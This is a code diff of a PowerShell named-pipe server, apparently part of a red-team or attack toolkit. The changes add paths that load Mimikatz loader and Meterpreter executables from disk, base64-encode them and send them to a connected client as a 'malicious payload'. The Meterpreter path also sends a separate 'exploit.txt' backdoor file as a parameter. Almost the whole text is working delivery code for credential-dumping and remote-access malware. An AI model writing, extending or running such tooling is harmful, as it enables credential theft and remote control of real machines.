@@ -40,24 +40,43 @@ try{
             $script_action = Read-Host "
             1.Mimikatz
             2.Meterpreter
+            3.Test PowerShell Assembly
 "
             
             Write-Host "Uploading malicious payload to client"
 
             if ($script_action -eq 1){
                 $sw.WriteLine("Mimikatz")
-                $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\YahudScript\MimikatzLoader\MimikatzCS.exe'
+                $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\PELoaderMimikatz\LoadMimikatz.exe'
                 $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
-                $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
-                $sw.WriteLine($assemblyString) # Server sending to the client
+                $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
+                $sw.WriteLine($assemblyB64) # Server sending to the client
                 [String]$parameter = Read-Host "Enter Parameter"
                 $sw.WriteLine($parameter) # Sending parameter to the client
                 $sw.Dispose()
                 $pipeServer.Dispose()
             }
 
-            else {
+            elseif ($script_action -eq 2) {
                 $sw.WriteLine("Meterpreter")
+                $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\yahudmeter.exe'
+                # $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\sharpmeter.exe'
+                $backdoor = "C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\exploit.txt"
+                $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
+                $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
+                $sw.WriteLine($assemblyB64)
+                [String]$parameter = [System.IO.File]::ReadAllText($backdoor)
+                $sw.WriteLine($parameter)
+                $sw.Dispose()
+                $pipeServer.Dispose()
+            }
+
+            else {
+                $sw.WriteLine("Test PowerShell Assembly")
+                $assemblyPath = "C:\Users\adminPC\Documents\Admin\Yahudmeter\yahudmeter.exe"
+                $sw.WriteLine($assemblyPath)
+                $backdoor = "C:\Users\adminPC\Documents\Admin\Yahudmeter\exploit.txt"
+                $sw.WriteLine($backdoor)
             }
 
         }
